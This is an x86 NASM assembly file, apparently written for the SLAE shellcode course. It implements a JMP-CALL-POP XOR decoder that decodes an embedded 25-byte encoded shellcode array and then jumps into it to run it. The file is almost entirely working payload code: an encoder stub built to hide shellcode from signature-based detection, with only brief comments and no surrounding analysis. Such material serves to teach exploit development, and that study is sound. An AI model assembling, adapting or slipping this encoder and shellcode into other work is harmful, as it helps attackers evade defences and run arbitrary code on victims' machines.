; Filename: xor-encoder.nasm
; Author:  Henry Wang
; Website:  http://nc-nlvp.party
; Training: http://securitytube-training.com 
;
; Purpose: Complete the SLAE challenge. Detail can be found in: https://wp.me/p9E4oI-2M


global _start			

section .text
_start:
	jmp short call_shellcode
lastbyte:
        ;in case there's one byte not be xored
        xor [ebx],al
        jmp execute_shellcode

decoder:
        xor ecx,ecx
        mul ecx;make eax,edx to zero
	pop ebx;give shellcode to ebx
        mov al, byte [ebx] ;key is in al
        inc bl;pint ebx to the real shellcode (remove key)
        mov edi,ebx;save shift to edi
        push 25;sie of encoded shellcode
        pop ecx
        dec ecx
        ;edx=0

decode:
        jecxz lastbyte 
        
        mov dx,[ebx]
        xchg dh,dl 
        xor dh,al
        xor dl,al
        mov [ebx],dx
        add bl,2
        sub ecx,2
        js execute_shellcode;if ecx=1 then it will be 1-2=-1<0, no more data need to process.
        jmp decode 

execute_shellcode: 
	jmp edi

call_shellcode:
	call decoder
	EncodedShellcode: db 0x90,0x50,0xa1,0xf8,0xc0,0xbf,0xbf,0xf8,0xe3,0xbf,0xf8,0xf9,0xf2,0x19,0xfe,0xc0,0x73,0x72,0x19,0x19,0xc3,0x20,0x71,0x5d,0x9b,0x10

